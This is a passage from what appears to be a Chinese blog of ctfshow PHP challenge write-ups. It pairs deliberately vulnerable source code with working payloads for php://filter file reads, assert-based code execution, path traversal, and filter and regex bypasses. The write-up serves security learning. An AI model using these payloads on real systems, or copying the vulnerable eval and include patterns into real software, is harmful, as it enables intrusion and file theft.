php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h1 id="web114-php-filter"><a href="#web114-php-filter" class="headerlink" title="web114(php://filter/)"></a>web114(php://filter/)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?file=php://filter/resource=flag.php</code></p><ul><li>发现root被过滤了，读取文件用伪协议</li></ul><h1 id="web115-is-numeric，str-replace，trim"><a href="#web115-is-numeric，str-replace，trim" class="headerlink" title="web115(is_numeric，str_replace，trim)"></a>web115(is_numeric，str_replace，trim)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure><p><code>payload: ?num=%0c36</code></p><ul><li>str_replace($search ,$replace , $subject)：<ul><li>参数：第一个参数是目标字符，第二个参数是要替换的字符，第三个参数是进行替换的原字符串</li><li>返回值：一个字符串或者数组</li></ul></li><li>trim()：去除字符串首尾处的空白字符</li><li>is_numeric()可以用<code>空格+数字</code>绕过但是trim把空白字符过滤了<ul><li>那么可以使用<code>%0c</code>绕过trim</li></ul></li><li><code>$num!==&#39;36&#39;</code>和<code>$num==&#39;36&#39;</code>区别：<ul><li><code>!==</code>：只要类型不同就不全等</li></ul></li><li>所以加上<code>%0c</code>换页符，在<code>==</code><strong>进行类型转换</strong>，所有<code>%0c36</code>会被转换为数值36，结果true；在<code>!==</code><strong>不进行类型转换</strong>，所以字符串和数值比较，类型不同，结果true。</li></ul><h1 id="web123-gt"><a href="#web123-gt" class="headerlink" title="web123([=&gt;_)"></a>web123([=&gt;_)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: fun=echo $flag&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li><code>!isset($_GET[&#39;fl0g&#39;])</code>和<code>$fl0g===&quot;flag_give_me&quot;</code>冲突：<ul><li>所以GET传参不能传参数，而且源码自带的输出flag也不能利用，能利用的只有它提供的eval函数</li></ul></li></ul><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。如：<code>/?CTF=ctf</code>变成<code>Array([CTF] =&gt; &quot;ctf&quot;)</code>。<br>查询字符串在解析的过程中会删除空白符，同时将某些字符删除或用下划线代替。如，<code>/?CTF[SHOW=42</code>会转换为<code>Array([CTF_SHOW] =&gt; 42)</code>。</p></blockquote><h1 id="web125-SERVER-‘argv’"><a href="#web125-SERVER-‘argv’" class="headerlink" title="web125($_SERVER[‘argv’])"></a>web125($_SERVER[‘argv’])</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?$fl0g=flag_give_me    fun=assert($a[0])&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li>网页模式下：<br><code>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</code></li><li><code>$_SERVER[&quot;QUERY_STRING&quot;]</code>：获取的是?后面的值</li><li>assert()： 检查一个断言是否为FALSE</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br><span class="line">    </span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>() 会检查指定的 assertion 并在结果为 <span class="literal">FALSE</span> 时采取适当的行动。</span><br></pre></td></tr></table></figure><blockquote><p>所以我们get传入的数据会保存到一个索引为0的数组中，且会被当作php脚本执行<br>POST参数中：因为过滤了echo，所以可以利用断言函数assert来执行上述数组，从而让<code>$fl0g=flag_give_me</code></p></blockquote><h1 id="web126-SERVER-‘argv’"><a href="#web126-SERVER-‘argv’" class="headerlink" title="web126($_SERVER[‘argv’])"></a>web126($_SERVER[‘argv’])</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?$fl0g=flag_give_me    fun=assert($a[0])&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li>过滤了flag还有一堆字母，但是是针对POST参数，GET参数不影响，所以payload跟上道题一样</li></ul><h1 id="web127-SERVER-‘QUERY-STRING’"><a href="#web127-SERVER-‘QUERY-STRING’" class="headerlink" title="web127($_SERVER[‘QUERY_STRING’])"></a>web127($_SERVER[‘QUERY_STRING’])</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?ctf[show=ilove36d</code></p><ul><li>源码将<code>$ctf_show</code>赋值为经过md5加密后的flag</li><li>想要输出flag，只能将<code>$ctf_show</code>重新赋值</li><li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>将<code>?</code>后面的数据以键值对的形式保存下来</li><li>又因为有个特殊符号检测，过滤了一大堆字符</li><li>所以可以利用<code>[</code>代替<code>_</code>重新将<code>$ctf_show</code>赋值</li></ul><h1 id="web128-gettext-，get-defined-vars"><a href="#web128-gettext-，get-defined-vars" class="headerlink" title="web128(gettext()，get_defined_vars)"></a>web128(gettext()，get_defined_vars)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?f1=_&amp;f2=get_defined_vars</code></p><ul><li>对<code>f1</code>参数进行了过滤</li><li><code>_()==gettext()</code>：翻译内容</li><li><code>get_defined_vars</code>：<ul><li>返回由所有已定义变量所组成的数组</li><li>变量包括环境变量、服务器变量和用户定义的变量</li></ul></li></ul><blockquote><p>因为调用了两次回调函数<br>所以外层回调调用的应该是一个函数，所以内层回调的结果应该是一个函数名字<br>要想得到函数名字，需要调用<code>gettext()</code>函数，来将<code>get_defined_vars</code>输出</p></blockquote><h1 id="web129-stripos，readfile"><a href="#web129-stripos，readfile" class="headerlink" title="web129(stripos，readfile)"></a>web129(stripos，readfile)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?f=./ctfshow/../flag.php</code></p><ul><li><code>stripos($haystack , $needle)</code> 查找字符串首次出现的位置（不区分大小写）<ul><li><code>$haystack</code>：在该字符串中查找</li><li><code>$needle</code>：目标字符串</li></ul></li><li><code>readfile()</code>输出文件</li></ul><blockquote><p>传入参数需存在ctfshow字符串，且不在第一个位置<br>访问ctfshow.php发现没有数据<br>所以猜测ctfshow可能是个目录<br>继续寻找当前目录没有数据，测试上层目录发现flag</p><p>或者可以使用php伪协议读取目录，伪协议中需要加上ctfshow</p></blockquote><h1 id="web130-stripos"><a href="#web130-stripos" class="headerlink" title="web130(stripos)"></a>web130(stripos)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f=ctfshow</code></p><ul><li>抱着试一试的心态随便传了个参数，没想到flag就出来了<code>0.o</code></li><li>第二个if判断让我们传入的参数需含有ctfshow</li><li>正则匹配会匹配ctfshow前面的字符，要想绕过此if判断，ctfshow前不能有字符</li></ul><h1 id="web131-最大回溯次数绕过"><a href="#web131-最大回溯次数绕过" class="headerlink" title="web131(最大回溯次数绕过)"></a>web131(最大回溯次数绕过)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f=ctfshow*100000036Dctfshow</code></p><ul><li><code>+?</code>看到这个一般都是最大回溯次数</li><li>传1000000个ctfshow绕过第一个if判断</li><li>最后传个36Dctfshow得到flag</li></ul><h1 id="web132-敏感文件"><a href="#web132-敏感文件" class="headerlink" title="web132(敏感文件)"></a>web132(敏感文件)</h1><ul><li>是个正常的网站，利用敏感文件<code>/robots.txt</code></li><li>或者拿御剑扫目录</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span 